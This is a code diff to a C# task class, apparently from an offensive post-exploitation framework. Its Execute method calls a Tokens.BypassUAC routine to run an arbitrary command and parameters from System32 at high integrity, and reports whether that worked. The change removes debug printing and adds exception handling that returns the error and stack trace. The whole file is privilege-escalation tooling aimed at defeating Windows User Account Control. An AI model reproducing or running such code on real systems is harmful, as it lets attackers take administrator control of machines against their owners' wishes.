@@ -6,21 +6,20 @@ public static class Task
 {
     public static string Execute(string Command, string Parameters, string Directory = "C:\\WINDOWS\\System32\\", string ProcessID = "0")
     {
-        Console.WriteLine("Command:" + Command);
-        Console.WriteLine("Parameters:" + Parameters);
-        Console.WriteLine("Directory:" + Directory);
-        Console.WriteLine("ProcessID:" + ProcessID);
-
-        using (Tokens t = new Tokens())
+        try
         {
-            if (t.BypassUAC(Command, Parameters, Directory, Int32.Parse(ProcessID)))
+            using (Tokens t = new Tokens())
             {
-                return "Successfully executed: \"" + Directory + Command + " " + Parameters + "\" with high integrity.";
-            }
-            else
-            {
-                return "Failed to execute with high integrity.";
+                if (t.BypassUAC(Command, Parameters, Directory, Int32.Parse(ProcessID)))
+                {
+                    return "Successfully executed: \"" + Directory + Command + " " + Parameters + "\" with high integrity.";
+                }
+                else
+                {
+                    return "Failed to execute with high integrity.";
+                }
             }
         }
+        catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
     }
 }
